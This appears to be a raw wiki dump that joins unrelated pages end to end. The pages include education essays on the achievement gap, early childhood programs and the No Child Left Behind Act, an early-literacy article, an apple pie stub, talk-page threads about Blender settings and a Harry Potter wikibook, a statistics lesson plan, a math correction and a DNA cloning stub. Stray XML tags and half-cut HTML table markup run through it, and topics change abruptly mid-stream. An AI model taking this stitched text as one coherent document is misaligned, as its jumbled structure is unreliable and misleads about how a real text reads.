The achievement gap is defined as the academic incongruence among social-class groups. Specifically, the gap in academic performance is between white middle-class and low-income minority students.  The achievement gap can be assessed on standardized test scores, grade point average, dropout rates, and college enrollment and completion rates. 


==Social-Class Trends Produces Gaps==
The achievement gap extends and widens across the U.S. between minority students and white students. 

“The National Assessment of Educational Progress (NAEP) indicates that African-American and Latino students from low socioeconomic backgrounds are two years behind other students in the fourth grade.  By twelfth grade, the gap has widened even further, with these students lagging nearly four years behind.” (White-Clark). 
 
	Low income and skin color alone do not influence academic achievement, however they are factors which define social-class; which unavoidably influence achievement.  For instance, the reading gap begins at home and is affected by the involvement of the parents.  Children whose parents have only a high school diploma or less are read to less often than those children of educated parents, who benefit from daily reading experiences (Rothstein).  It’s feasible to conclude that when these children start school together the achievement gap begins.  It is likely that the child who has had more reading experiences is easier to teach and will read earlier than the child who is just beginning to hold a book.

“Children reared by parents who are professionals will, on average, have more inquisitive attitudes toward material presented by teachers than will children reared by working-class parents” (Rothstein). Middle-class parents are more likely to have professional work experiences which involve collaboration and effective communication skills.  Parents then use these problem solving, communicative skills with their children.  However, working-class parents on average have jobs that require them to follow instructions, leaving little room for questioning.  This behavior therefore is taught to their children.  

Another factor which contributes to the achievement gap includes the health and housing gaps.  low-income children have overall poorer health attributed by prenatal conditions, poorly trained eye sight due to watching too much television, asthma and lead  poisoning due to poor living conditions and inadequate health care (Rothstein).   Also, low-income children are more likely to miss school for relatively minor sickness due to the fact that there are fewer primary-care physicians in low-income communities.  The achievement gap widens as adequate housing becomes increasingly unaffordable and the family is forced to become mobile.  By changing schools often the child of the low-income family has to catch up on school material as well as adjust to the transition (Rothstein).   

==Closing the Gap==

	While more than one-third of today's public school students are people of color and by 2025 it has been projected that figure will reach 49 %, the number of minority teachers are decreasing  (approximately 13% of teachers are of minority descent and more than 40% of the schools across America have no minority teachers) (White-Clark).  These statistics may negatively affect the achievement gap if non-minority teachers have not been sufficiently prepared to teach minority students. 

	Professional development on the issue of diversity is a promising approach to closing the achievement gaps of diverse students. Administrators need to be the supportive link by providing professional development opportunities as well as being a positive role model for their teachers. One professional development model which supports diversity instruction is The Reflection-Instruction-Collaboration-Supportive Model (RICS) (White-Clark).  It includes the following elements: reflection, instruction, collaboration and support.  This model offers reflective activities for teachers to become self-aware of personal perceptions and attitudes about working in a diverse school setting, and their expectations of their students, it also includes specific instructional strategies that will enhance the achievement of culturally diverse students, it works to build strong collaborative work cultures that will develop long-term capacity for change and a support system which increases teachers' self-efficacy and encourages them to initiate and implement effective strategies for school. (White-Clark).  
	
	Also, early childhood programs play a large role in preventing achievement gaps, especially at the start of kindergarten, throughout school and into the work place.  Long-term studies on the benefits of early childhood development should be reviewed.  Four such studies are: the Perry Preschool Project, the Prenatal Early Infancy Project, the Abecedarian Early Childhood Intervention, and the Chicago Child-Parent Center Program. 
 
	These studies all show that children enrolled in high-quality Early Childhood Development (ECD) programs are more successful in school and in life than those children who were not enrolled in such programs (Lynch).  The studies also established that children who have participated in high-quality ECD programs have higher scores on math and reading, have greater language skills, have less grade retention, have less need for special education, improved nutrition, have lower drop out rates, higher levels of schooling attainment and students are entering school “ready to learn”(Lynch). 

	Also, research data collected from a program titled “The High/Scope Perry Preschool Study” shows evidence that those children who attended preschool out performed children who did not attend preschool on standardized tests (High Scope Resource, 2006).  Research also shows that children who attend preschool will do better in school, attend college, have better jobs, pay more on taxes and will even be better parents (Clothier and Poppe, 2006).

border: solid 1px #FFBDBD; padding: 1em;&quot; valign=top&gt;
It’s imperative for low-income minority students to be given the opportunity to experience similar social-class trends as middle-class students in order to close the gap or prevent the achievement gap before the start of school.  

&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
	Why would these ECD programs close the achievement gap?  To narrow the gap, early childhood care, needs to begin with infants and toddlers, should be provided by adults who can offer the kind of intellectual environment that is typically experienced by middle class infants and toddlers (Rothstein).

==Essay Question==

	Are early childhood development programs and teacher professional development initiatives enough to close the achievement gap?  If so, why and if not explain additional methods to close the gap.

'''Sample Answer'''

	ECD programs which promote school readiness in terms of behavior and intellect and also teach low-income parents the behaviors which promote child development and school readiness are highly favorable to closing the achievement gap before the start of school.  This is a great advantage for those children who are set up early for unsuccessful school experiences.  If these children can begin kindergarten with similar experiences as those of middle-class children then they are likely to be successful in school.

	Also, teachers who have been trained on the issue of diversity are likely to be significantly more influential to the success of low-income minorities than those teachers who have not been trained well.  If teachers use specific instructional strategies when teaching low-income minority children it almost certainly will enhance the children’s achievement.

	However great these methods are at enhancing low-income minority children’s success they will not fully close the gap.  The achievement gap is a vast issue which needs multifaceted methods in which to obtain a resolution.   Since the achievement gap is between social classes the answer to closing the gap lies with the need to bridge the classes.  This is an extremely lofty goal since for ages due to stigma, America has denied that our nation even has social classes and even if we were to recognize social classes the reform would need to begin here.  I advocate for initiatives which focus on teaching parents how to develop their children’s inquisitive nature, home visitations by teachers, free educational resources and community partnerships with schools.  These I believe will make great headway at closing our nation’s achievement gap.

      <text xml:space="preserve">=='''Bridging the Student Achievement Gap in Public Schools: Who’s accountable? '''==

Written by: Joanne King

==Accountability==

With the No Child Left Behind (NCLB) law in full swing, all public schools are accountable more than ever for students’ progress throughout their K-12 school careers. There has always been academic imbalance among poor and middle-class black and white children. The stakes are high for all public schools. With this in mind, “creative” methods have to be in place to reach those students who are not grasping what they need in order to be productive adults. There are millions of dollars being allocated each year by the federal government to school districts in order for them to achieve success with low-performing students or else face heavy penalties for not meeting certain benchmarks or goals. The NCLB law also requires states to separate out their test scores by race so officials can track and try to narrow achievement gaps between groups of students. The NCLB law was designed to help the public school systems close the learning gaps between students, regardless of race, gender and social economics. The accountability lies with all who work with children in a public education setting. This includes custodians all the way up to the superintendents of each school district in the U.S. This reform has to start within the students’ homes, too. It cannot just be an educational reform. Parents and the like have to do their part in order for their children to be productive adults who one day can stand on their own two feet. It has to be a team effort in order to bridge the achievement gap that is holding so many back.

==Why the Achievement Gaps?==

According to the Teaching Commission’s report, Teaching At Risk: A Call to Action, “the U.S. job market is so scientifically and technologically based that math and science knowledge is critical for the health of our economy.” The report goes on to say that “stagnant math and science performance in schools shortchanges our students’ future and endangers our prosperity and our nation’s security.” In addition, the NCLB reform believes that because teachers are not as qualified as needed to teach math and science, they do not teach those subjects effectively. Furthermore, students do not get taught what they need in order to compete with such a competitive world. (Paige, 39). Richard Rothstein states that “the achievement gap can only be improved with social and economic reform.”  (2004, p.19). He suggests that children who are not submersed in literature or who do not converse properly at a very young age more than likely will see gaps early on in their elementary years. There are several more contributors of low achievement, especially from children who come from lower-income families. These lower-income families are forced into living with poorer housing conditions than that of middle or higher income families. In addition, the lack of stable housing goes hand in hand with the lack of proper health care. 

Lower income children are also at a greater risk of asthma because of smoke and other like factors that surround them within their homes. 

These health issues result in several absences from school throughout the school year. (2004, p.21). Those missed days of critical instruction can never truly be made up. According to the National Center for Education Statistics (NCES), the “digital divide” is still a significant and consistent problem within our state’s diverse school populations. It was noted that “by far, more white children than black or Hispanic youth continue to access the Internet and use computers.” (Virginia Journal of Education, p.5)  These gaps are, of course, smaller during the school day where most schools have assess to multiple computers connected to the Internet. But home computer use is still a great problem “with about 54 percent of white children using the Internet at home, as compared with 27 percent of black children and 26 percent of Hispanic children.” (2006, p.5). The NCES also stated that the “level of parental education, family income, and two-parent families are all correlated with higher computer usage rates.” (2006, p.5). As one can see, the task of “bridging” the achievement gap is a monumental task. Without a doubt, it will take consistent and systematic strategies to revise and repair our current status of disparity. 


==Strategies to Close the Gaps==

Many strategies and “fix-it” programs have helped over the years, but more reform needs to be implemented immediately before the achievement gap gets any wider. A current Newsweek magazine article suggested that one way to “close” the gap is to have longer school days in those states that are not presently doing so. For example, it was noted that children in Memphis, Tennessee get about five weeks less schooling than children in Houston, Texas. (2007). The good news is that the federal government is addressing this problem nationwide, and hopefully they will come up with the funds to pay for the extra cost of this proposed plan in all states that have shorter school years.  In addition, the NCLB law directs states to track and to analyze each student’s progress by use of benchmark tests results. This data allows teachers and administrators a chance to formulate intervention strategies a lot quicker for those who are not meeting the criteria or benchmarks set by their school districts. (Morgan, 2007). Another practice that is used by some schools across the U.S. to narrow the achievement gap is a practice known as “narrowing the curriculum.” This practice is where schools reduce instructional time spent in science, history, art, etc., so that instruction can be focused on math and reading only. (Whelan, 2006). Schools are forced to be creative with how they remediate struggling students. Remediation can range from pulling students out of class to creating single-gender classes to help improve learning for male students who typically score lower on achievement test. Some of the most interesting studies are those that credit early childhood education as the key to student success in the future. It is reported that “nearly 20 percent of the children entering kindergarten in South Hampton Roads are not ready to learn.” (Fernandes &amp; Shaw, 2006). The push is on for more government money to be invested in pre-kindergarten. The subject has gotten the attention of Governor Timothy Kaine of Virginia. He stated in Fernandes’ &amp; Shaw’s report that “he plans to include a significant amount of money for early education next year.” He also stated that if “you solve the readiness gap, you solve the achievement gap.” (2006). Recently, the Virginia Education Association (VEA) received a $20,000 grant from the National Education Association to help restructure state education policies and create initiatives to help close student achievement gaps. There are two topics of focus for the VEA, “bring Virginia’s teacher salaries up to the national average and to help secure funding for statewide preschool programs.” VEA’s president, Princess Moss, was adamant about what it would take to close the state’s achievement gaps. 

She stated “that children of color and poverty [need to] have access to highly qualified teachers and a high-quality preschool.” (Allen, 2007).

In another study done by the National Institute for Early Education Research (NIEER), they found that “children who attend high-quality preschool enter kindergarten with better pre-reading skills, richer vocabularies, and stronger basic math skills than those who do not.” (Kanter, 2007). Needless to say, federal and state governments have to “step up to the plate” and fund these programs that have been proven by research to work. Our future is at risk.

“Education would be much more effective if its purpose was to ensure that by the time they leave school every boy and girl should know how much they do not know, and be imbued with a lifelong desire to know it.”  Sir William Haley
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

==Conclusion==

Without structure and direction, children of all ages will fail to meet the basic standards of education. It is clear that an educational journey begins with a quality early childhood education, and should be provided for all 4 year olds, not just a select few. The “buzz” word in educational circles is that a good education begins with a quality preschool. The benefits of an “early start” in school are enormous. Judi Hornbeck, Director of Elementary Education for Dare County Schools, stated recently that “preschool is not just academics. It’s social and emotional preparation. They know how to take turns, to wait in line, to share, and to have a friend.” (Davis, 2007). What a great start to “life” his would be!

==Essay question==

If you could do one thing to improve the achievement gap(s) in public schools, and money was not an issue, where would you begin?


If I could do just one thing to improve the achievement gap(s) in public schools, I would start with the implementation of mandatory preschool. With the research that has been done on the benefits of preschoolers going to school all day, five days a week, there is no reason not to implement high-quality preschools in all elementary schools. One of the most famous studies done on preschool research is the High/Scope Perry Preschool Study. The study’s author, Dr. David Weikart, conducted a forty-year study on the benefits of preschool on children that lived in poverty. He, along with other preschool researchers, has found it very beneficial to invest in the preschool program because of the long term benefits for our “future” as a society. In other words, if we, as a society, will invest and allot “major” funds for high-quality preschool programs, there would be a higher return on “our” money with less crime, less remediation in K-12, less welfare dependence, and the like. The research also shows that there would be higher achievement scores, and a higher quality of life with those who attend preschool. It is a known fact that living with poverty also means living with poor or no health care services. With this in mind, I would implement “visiting medical teams” that would provide everything a child would need in terms of medical care and locate it right in the school. These medical teams would make it possible for all children to be seen, reducing the days absent from school. In addition, I would implement a need-based program that would allow every student a computer, with filters, to take home on a loan basis. The computer loan program would be very much like the way textbooks are handled each year by schools. With these types of programs in place, it would not be long before we, as a society, would reap the benefits of our initial investment(s).

An '''apple pie''' is a fruit [[Cookbook:Pie|pie]] (or [[Cookbook:Tart|tart]]) in which the principal filling ingredient is [[Cookbook:Apple|apple]]s.  Pastry is generally used top-and-bottom, making a double-crust pie, the upper crust of which may be a pastry lattice woven of strips; exceptions are '''deep-dish apple pie''' with a top crust only, and open-face
[[Cookbook:Tarte Tatin|Tarte Tatin]].

Here are three variations on apple pie:
#[[Cookbook:Apple Pie I|Apple Pie I]]: an apple pie recipe which suggests a variety of apples.
#[[Cookbook:Apple Pie II|Apple Pie II]]: a recipe that uses the first one as a model; uses McIntosh apples exclusively.
#[[Cookbook:Tarte Tatin|Tarte Tatin]]: an open-faced kind of apple pie.

== Recommended Memory Settings ==

&quot;If you have a good computer with a lot of memory, you might want to increase that limit (up to 64), while if your computer is old and sickly, you may consider decreasing it to 10 or 20.&quot;

Can we have a more precise measurement here for the more technically minded? I'm a Blender noob, and don't want to be stuffing it up yet. I'm also guessing they mean RAM, but how much? Clarification please.
(unsigned)

::I was coming here to ask the same question but realized that most of that answer is subjective.  I, like you, assume it's a condition of RAM, considering &quot;old and sickly&quot; are conditions affected by RAM usage.  If you consistantly work on files with larger Filesizes, you'd need more RAM than someone who typically works on isolated objects which are then incorporated into a larger file. It's subject to other factors too, such as, are you running other programs at the same time, and how much of your RAM resources are being soaked up by those?  (Operating System, Virus Scanners, Network monitors, Image editing software, etc)   

::I think the most precise way to look at this question is to try the default, and if the program runs smoothly and quickly, you could risk using a higher number, or if there's a sluggish response, perhaps even only on a large file, you could move the number downwards until Blender performed smoothly again.
::You didn't sign your comment, so I don't know if you're planning to come back to the page and read this, nor how old your question is, nor how to contact you at this point with my answer.  Please sign your comments by typing &lt;nowiki&gt;--~~~~&lt;/nowiki&gt; at the end of your post, or by using the &quot;Signature/Timestamp Button&quot; found directly above the edit area. 

::Also you should use the &quot;Plus&quot; sign to add another topic to a discussion page.  I went back and gave you a title, etc, manually.  --[[User:Deadguy|Deadguy]] ([[User talk:Deadguy|talk]]) 17:55, 24 August 2009 (UTC)    

== Blender wants to save in the administrator directory (windows) ==

You should propably mention that blender tries to save it's pereferences in the administrator user directory even if the user has a restricted account (see [http://blenderartists.org/forum/showthread.php?t=138795&amp;highlight=2.48a+user+default here]). [[Special:Contributions/217.80.243.183|217.80.243.183]] ([[User talk:217.80.243.183|talk]]) 22:23, 10 March 2009 (UTC)


== Blender saves current size of Preferences Window ==
Might want to add a note that preferences window size is one of the preferences saved.
--[[User:Wgoelkel|Wgoelkel]] ([[User talk:Wgoelkel|talk]]) 04:10, 5 April 2009 (UTC)


== Rotation Settings ==
I've been following the tutorials so far and found the default rotation style a little too unnatural.
I found it quite useful to change the rotation to turntable mode in the user preferences.

== Coverage of the Addons options ==

There is also a Addons window in blender, so that different extensions may be used. it is in the same place as the preferences.
it looks like this page doesn't include information on many of the features of the preferences window, so if I can I'd like to add a part about the addons.

      <text xml:space="preserve">Please stop adding chapter links to the bottom of [[Muggles' Guide to Harry Potter]] pages. It is not useful and against standards. Thanks. -[[User:Withinfocus|&lt;font color=&quot;#000000&quot;&gt;'''within'''&lt;/font&gt;]][[User talk:Withinfocus|&lt;font color=&quot;#7A7A7A&quot;&gt;'''focus'''&lt;/font&gt;]] 01:59, 15 March 2007 (UTC)

:I've stopped for the moment. But I ''did'' find it useful—it saved me from having to go back to the index to be able to continue on to the next chapter's synopsis. And I did a quick search for a policy/guideline forbidding such and failed to find any. Since I'm relatively new to the wiki, I'll assume, in good faith, that it is there and that I just failed to find it. Would you mind pointing it out to me?

::Although you tried to clear this out, please see [[Talk:Muggles' Guide to Harry Potter#Project_standards|here]] for standards on how to write pages in our book. We have spent a great deal of time in formulating a strict system for page setup. The links you added are redundant and already exist at the top right of the page. Furthermore, they don't have a purpose in &quot;Greater Picture&quot; and are merely for navigational use, thus the reason for using a template and placing such content off to the top and side of the page, similar to turning the page of a book. Many things are not strictly policy here, especially if you came from Wikipedia where every little issue has been standardized. We trust book contributors here to create their own editing standards. You haven't violated a site-wide policy, but you have differed from normal editing practices. If you have further comment, please respond on my talk page. -[[User:Withinfocus|&lt;font color=&quot;#000000&quot;&gt;'''within'''&lt;/font&gt;]][[User talk:Withinfocus|&lt;font color=&quot;#7A7A7A&quot;&gt;'''focus'''&lt;/font&gt;]] 17:25, 15 March 2007 (UTC)

:::I cleared it out because after going back I noticed the page links at the top of the page. Sorry for the inconvenience. I'm at a university, so the IP broadcast is shown for all the computers on campus. I'll clear this again, later, so it doesn't get cluttered.

::::You're still making good edits elsewhere. Thanks for the contributions. -[[User:Withinfocus|&lt;font color=&quot;#000000&quot;&gt;'''within'''&lt;/font&gt;]][[User talk:Withinfocus|&lt;font color=&quot;#7A7A7A&quot;&gt;'''focus'''&lt;/font&gt;]] 12:44, 16 March 2007 (UTC)

::::I'd personally prefer you not clearing this page, at least not until it gets &quot;cluttered&quot;. It could be useful as a reference about those edits, and as indication that you apologized for them. But, it's still your choice. -- [[User:Jokes Free4Me|Jokes Free4Me]] 14:31, 27 June 2007 (UTC)

::By the way, you could have just edited the URL in the address bar to get to the next synopsis. ;-) -- [[User:Jokes Free4Me|Jokes Free4Me]] 14:31, 27 June 2007 (UTC)</text>

      <text xml:space="preserve">== MYTHBUSTING: ''GIRLS CAN'T CATCH''==

'''TEACHING OBJECTIVE:''' 
* Students develop their own method of investigation, based on the knowledge that they will need to use the T-test to analyse their results. 

&lt;BR&gt;

'''TASK OUTCOMES:''' 
* By the end of this activity, students will be able to: 
** design and evaluate a method of investigation based on scientific conventions. 
** apply the T-test to a set of data generated in an investigation
** present their data in an appropriate format, using scientific conventions

&lt;BR&gt;

'''TIME REQUIRED:''' 
* 90 minutes - 2 hours


&lt;BR&gt;

----

'''INTRODUCTION:''' 
&lt;BR&gt;
Is there really a difference between boys' and girls' catching abilities? The boys will surely say there is, the girls the opposite. Here's a chance to find out. 


Teams will work together to design a method for testing the null hypothesis: 'there is no difference between boys and girls in terms of catching ability'. Their method should allow them to test their data using the T-test and present their results appropriately. 


This task will allow exploration of many of the fundamentals of reseacrh science, including sample sizes, fair tests, application of statistics, evaluation of methods, limitations of results, presentation of data. It is a bit silly, but statistics needs an injection of fun. 



'''MATERIALS AND EQUIPMENT:''' 
* balls
* measuring tape/ sticks
* other equipment as groups require
*
*
*
*


OTHER RESOURCES NEEDED: 
* Prior knowledge of the T-test and basic scientific method/ fair testing required
* 
*



'''INSTRUCTIONS:''' 
* Put students into small, mixed-gender groups. 
* Set the research question: 'Is there a difference between boys and girls in terms of catching ability?'
* Allow the groups time to develop a '''simple''' method for testing the hypothesis, which will allow them to utlise the T-test. 
* Once methods have been approved, allow sufficient time for groups to collect enough data. 
* In the next lesson/ at home, students apply the T-test to their data, make a poster of their results and present it to the class. 
* As a class, discuss the limitations of each group's method, datasets and data analysis. How can this investigation help students plan more scientifically in the future? 
*
*
*
*


'''SAFETY/ RISK ASSESSMENT'''
* Ball-throwing outside, in plenty of space. 
* First-aid supplies ready for the boys who make inappropriate comments about girls' coordination.
*


----


'''IDEAS FOR FURTHER INVESTIGATION'''
* Ask students to brainstorm other areas of science that could be explored using the T-test. 
* Refer back to this activity when sampling populations in Ecology. 
*

      <comment>The range of arctan is not 0&lt;x&lt;180, rather it is -90&lt;x&lt;90</comment>
      <text xml:space="preserve">The formula for the argument is slightly wrong:
:&lt;math&gt;\theta = \tan^{-1}\frac{y}{x}\,&lt;/math&gt;
This only ever gives an answer that is a positive or neagative acute angle (i.e. the 1st or 4th quadrant): numbers in the other two must have &lt;math&gt;\theta&lt;/math&gt; adjusted by &lt;math&gt;\pi&lt;/math&gt; to get a correct answer. Perhaps more detail should be put into this later on, including how to do it without arctan (ie, instead doing it by arccos or arcsin, after factoring out the modulus)

      <text xml:space="preserve">==Early Literacy==

== Literacy-Rich Environments &amp; Parental Involvement ==

By: Breana Thomas


== Introduction ==

Children need plenty of opportunities to experiment with reading and writing to foster early literacy. The student’s environment and activities should inspire an appreciation for words, stories, and communication. Parents and family members play important roles in supporting, sharing, and exploring literacy with their children. Parents need to read out loud to their children and make home environments literacy-rich where real and memorable learning can take place. 

== The Classroom Environment ==

&lt;table WIDTH=&quot;60%&quot; ALIGN=&quot;right&quot;&gt;&lt;tr&gt;&lt;td style=&quot;background-color: #FFF7F7;
border: solid 1px #FFBDBD; padding: 1em;&quot; valign=top&gt;
. “Optimal learning takes place in a setting in which children feel comfortable, safe, and at ease” –C.S. Weinstein

&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;



Early literacy learning is critical. Students need to be exposed to literary events as well as literacy-rich environments from a very young age. Students need the opportunity to explore literacy through thinking, listening, speaking, reading, and writing. Activities that foster literacy development should meet the needs and learning styles of the students in the classroom. “Optimal learning takes place in a setting in which children feel comfortable, safe, and at ease” (Weinstein, 1987). With this in mind, classroom areas should be well organized and aesthetically pleasing and appealing to students. 

Classrooms need to have areas for students to engage in collaborative work, as well as areas for private, independent practice. “Physical surroundings impact learning. Rooms partitioned into small spaces lead to more talk and cooperation” (Morrow, 2002). Teachers can use low bookshelves, tables, and rugs to define areas within a classroom. 

The classroom needs to be filled with print. Posters, bulletin boards, and words walls need to display words and concepts learned, and should be interactive and promote literacy development.

 
== Dramatic Play Centers ==

“A number of studies have shown that integrating literacy artifacts into children’s play settings can encourage children’s print awareness” (Pullen, Justice, 2006). Centers such as a post office, restaurant, and housekeeping center can provide children with lots of literacy-enriched play materials.

The classroom post office will encourage the writing of letters and written correspondence. Materials included in this center will consist of pens, stamps, envelopes, mailboxes, and paper. Students will understand that printed materials provide information and realize that the printed words have a purpose. Just like in the post office center, the children learned that they can communicate by writing and that words have meaning. Sending letters to other students and adults will help children become writers, which will help them to become better readers.

A restaurant center will let students take on the roles they see outside of school. Students will become servers, cooks, and customers. Materials that will promote literacy in the restaurant center include order pads, menus, pens, recipes, cookbooks, receipts, and play money. Have recipe cards for students to make different meals such as soups and sandwiches. Not only does this provide children with hands-on learning of sequencing and following directions, it allows children to see positive results from reading.

A classroom housekeeping center should include items a child may see at home, such as recipes, cookbooks, newspapers, magazines, phonebooks, message pads, and grocery lists. Children should be encouraged to find items in the play area that they have on their lists. They can then sort their items, and read the products labels as they learn to organize the cupboards or play fridge. 

Dramatic play centers should be changed often and engage students to learn and explore literacy naturally. “By involving students in an activity in which they explore literacy naturally, you know that you have their attention and their interest” (Gunning, 2005). Teachers need to use developmentally appropriate literacy instruction. The instruction used needs to acknowledge children’s development, their interests, and literacy knowledge. 


== Parental Support ==

Parents need to be supported in sharing and exploring literacy with their children. Parents can begin an endless learning chain by reading to their children. Children develop a love poems and stories and will want to try reading on their own. With practice, students will read for information and pleasure. Students need a strong foundation for a young child to become a lifelong reader. Parents need to spend time with their child reading to them and listening to their child’s questions. These moments are enjoyable and memorable. Parents can stimulate their child’s interest in reading and learning language. Parents know what their child (ren) is interested in and can incorporate the child’s interests into learning. Parents need to be aware of the reading programs the school uses that their child will be exposed to. With this knowledge, parents can extend the learning process and find where his/her child needs the most support and practice skills at home. Parents that can’t read well themselves are encouraged to tell oral stories or tales. Children love listening and spending time with mom and/or dad.
      
Teachers can support their students' parents with tips on instructional strategies that will support the child’s learning at home. Teachers need to suggest to parents to label objects in the home. A print filled environment will help make the child conscious of print in everyday life. Teachers could also have special backpacks with activities and books for students to bring home and use with their parents. Parents may not have the resources they need to help instruct their child, so a backpack with activities would be ideal for every family. Teachers should suggest that parents read-aloud with their children to promote literacy.

== Read-Aloud ==

Reading out loud to children helps them develop in oral language, cognitive skills, concepts of print, and phonemic awareness; all areas that are important to formal reading instruction. Students are exposed to higher leveled books and the teacher/parent models reading for enjoyment. Parents and teachers should enhance read-aloud by having the child point to objects in the pictures. Parents and teachers need to model that print is read from left to right. They can model this behavior by following the words with their fingers. Involving the child in turning the pages also teaches them that the pages turn from right to left. Talking about the stories read can help children build their vocabulary and link stories to their daily life. Parents should have their child predict and use their background knowledge of the subject to formulate those predictions. Talking about a story not only builds their vocabulary and understanding of the world, but it gives the child the ability to carry on a conversation which is important for reading development. 

Read-aloud advocate, Jim Trelease (2001), testifies to the value of home and school read-aloud in his best-selling book, The Read-Aloud Handbook (5th ed.). “Every time we read-aloud to a child or class, we’re giving a commercial for the pleasures of reading.” Read-aloud help students comprehend literacy language, develop story structure, and build on comprehension and vocabulary. Parents and teachers should choose books that students can relate to and make personal connections. 

Exposing children to literacy-rich environments and developmentally appropriate practices/instruction will provide students the opportunities and encouragement to become successful readers. Students need environments that provide them with opportunities to read, share, and display their writing. With support, parents can be engaged in sharing and exploring literacy with their child.

== Essay Question ==

Your principal asks you to set up a new dramatic play center to enhance a literacy-rich environment that also correlates to the standards of learning- community helpers (k.6). You decide to turn the center into a travel agency. Describe what this center will look like and the materials that will be available to enrich literacy. 



The travel agency will have two desks for the agents and four seats for customers. Students will take on roles of tourist or agent. The wall of the center will be filled with posters displaying destinations all over the world. Featured destinations include Greece, China, Mali, Rome, Egypt, and Mexico. There will be a brochure holder containing brochures from all of the places featured on the wall. The agency will have artifacts from each featured destination for the students to manipulate. There will be a poster with trip packages available for sale. The student agents must decide prices for each trip and write it on the board. Students will also be responsible for naming their agency.

The agency will have a prop box for the students to look the part. There will be outfits suitable for tourists and agents. The center will include a computer, phone and reservation book. Along with pens, luggage tags and tickets that students can fill out according to the destination chosen. Magazines and travel books will be available for travels to glance through in order to decide where they would like to visit. The agency will have luggage and travel supplies for the travelers to buy. Once the traveler has decided where he/she wants to go, the agent will write out tickets and charge for their services.

      <text xml:space="preserve">== DNA CLONING ==

This term refers to the process of transferring  DNA fragment of interests from one organism to a self-replicating genetic element e.g. a ''bacterial plasmid''. The DNA of interest can then be propagated in a ''foreign host cell''. This technology has been instigated from the 1970s, since then it has become widely used and is a common practice in ''molecular biology'' labs to this very day.

By Faye Ninos

=='''History of the federal role in Education'''==
NCLB culminates more than four decades of federal expansion into public education, beginning largely with the Elementary and Secondary Education Act of 1965 (ESEA). As part of President Lyndon B. Johnson's &quot;War on Poverty,&quot; he created the ESEA which appropriated approximately $2 billion in its initial year to help states improve educational opportunities for the underclass. The federal government decided to continue its assistance to states and from 1965-1975 federal funds for elementary and secondary education increased by more than 200 percent.  The country, however, slipped into economic hardship for the following five years, and federal spending on education only rose by 2 percent.  

In 1980, President Ronald Reagan took office and adamantly opposed expanding the federal role in education and even campaigned for the abolishment of the recently created U.S. Department of Education.  He drastically cut back federal spending on education and believed that establishing academic standards should be left up to the states. The result is the diversity of state education systems that are now in place.  

George Bush, Sr. and Bill Clinton both attempted to provide national support to the state and local standards movements in education.  George Bush, Sr. held an Inaugural National Education Summit, where he and the US Governors came up with six broad objectives to be reached by the year 2000, dubbed “America 2000.”  In addition, he created the National Education Goals Panel to monitor and report on the progress made toward meeting the six objectives.  President Clinton adopted most of the same recommendations from the Education Summit and signed the Goals 2000: Educate America Act, which created a National Education Standards and Improvement Council with the authority to approve or reject states’ standards.  When the Republicans took control of congress during Clinton’s term, they opposed the federal role in education and the council consequently died.  Shortly thereafter, Clinton signed the Improving America’s Schools Act (IASA) of 1994.  IASA is a prior re-authorization and revision of the original ESEA.  It became clear that the federal government was investing in standards and assessments as the means to hold schools more accountable for the performance of its students. States were still allowed the autonomy to develop their own education system. To continue receiving federal funds, however, the state had to comply with the general requirements of IASA.

When President George W. Bush took office in 2000, he placed education as the foremost priority on his domestic policy agenda. The president developed a new federal role in public education by building on the successes of IASA and his own experiences with the Texas education system during his tenure as governor.  (National Conference of State Legislatures)

Today, nearly 70 percent of inner city fourth graders are unable to read at a basic level on national reading tests, our high school seniors trail students in international math tests, and nearly a third of college freshmen must take remedial courses before they can begin regular level college courses.  In response to a great number of Americans falling behind in education, No Child Left Behind was born. (President George W. Bush)

=='''No Child Left Behind Act of 2001'''==

	President Bush signed the No Child Left Behind Act on January 8, 2002.  No Child Left Behind is based on stronger accountability for results, more freedom for states and communities, proven education methods, and more choices for parents.  

States are working to close the achievement gap and make sure all students, including those who are disadvantaged, achieve academic proficiency.  Annual state and school district report cards inform parents and communities about state and school progress.  Schools that do not make progress must provide supplemental services, such as free tutoring or after-school assistance; take corrective actions; and, if still not making adequate yearly progress after five years, make dramatic changes to the way the school is run.   

States and school districts have unprecedented flexibility in how they use federal education funds.  For example, it is possible for most school districts to transfer up to 50 percent of the federal formula grant funds they receive under the Improving Teacher Quality State Grants, Educational Technology, Innovative Programs, and Safe and Drug-Free Schools programs to any one of these programs, or to their Title I program, without separate approval.  This allows districts to use funds for their particular needs, such as hiring new teachers, increasing teacher pay, and improving teacher training and professional development.  

No Child Left Behind puts emphasis on determining which educational programs and practices have been proven effective through rigorous scientific research.  Federal funding is targeted to support these programs and teaching methods that work to improve student learning and achievement.  In reading, for example, No Child Left Behind supports scientifically based instruction programs in the early grades under the Reading First program and in preschool under the Early Reading First program.  

Parents of children in low-performing schools have new options under No Child Left Behind.  In schools that do not meet state standards for at least two consecutive years, parents may transfer their children to a better-performing public school, including a public charter school, within their district. The district must provide transportation, using Title I funds if necessary.  Students from low-income families in schools that fail to meet state standards for at least three years are eligible to receive supplemental educational services, including tutoring, after-school services, and summer school.  Also, students who attend a persistently dangerous school or are the victim of a violent crime while in their school have the option to attend a safe school within their district. (Ed.gov)

=='''Is it working?'''==

	Multiple studies and reports show that student achievement is rising across America:
The long-term Nation's Report Card (NAEP) results, released in July 2005, showed elementary school student achievement in reading and math at all-time highs and the achievement gap closing.

For America's nine-year-olds in reading, more progress was made in five years than in the previous 28 combined.  

America's nine-year-olds posted the best scores in reading (since 1971) and math (since 1973) in the history of the report. America's 13-year-olds earned the highest math scores the test ever recorded. 
Reading and math scores for African American and Hispanic nine-year-olds reached an all-time high. 
Math scores for African American and Hispanic 13-year-olds reached an all-time high. 

Achievement gaps in reading and math between white and African American nine-year-olds and between white and Hispanic nine-year-olds are at an all-time low.

NCLB TERMS THAT EVERY PARENT SHOULD KNOW:

Title 1 - This is the part of No Child Left Behind that supports programs in schools and school districts to improve the learning of children from low-income families.  The U.S. Department of Education provides Title 1 funds to states for school districts based on the number of children from low-income families in each district.

State Assessments - the tests developed by your state that your child will take every year in grades 3-8 and at least once in high school.

Adequate Yearly Progress (AYP) - explains that your child’s school has met state reading and math goals.
School In Need of Improvement -  schools receiving Title 1 funds that have not met state reading and math goals for at least two years.

Supplemental Education Services (SES) - the tutoring and extra help with schoolwork in subjects such as reading and math that children from low-income families may be eligible to receive.  It is provided free of charge and usually takes place outside the regular school day.

